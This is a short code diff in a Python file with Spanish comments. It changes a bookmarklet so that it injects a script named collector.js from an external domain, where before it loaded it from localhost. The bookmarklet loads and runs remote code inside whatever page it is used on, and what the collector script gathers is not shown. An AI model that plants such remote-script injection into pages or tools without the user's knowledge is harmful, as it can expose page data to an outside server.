@@ -13,7 +13,7 @@ def main():
     # Código del bookmarklet
     bookmarklet_code = """javascript:(function(){
     var s=document.createElement('script');
-    s.src='http://localhost:8000/static/collector.js';
+    s.src='https://hoomextractor.online/static/collector.js';
     document.body.appendChild(s);
 })();"""
     
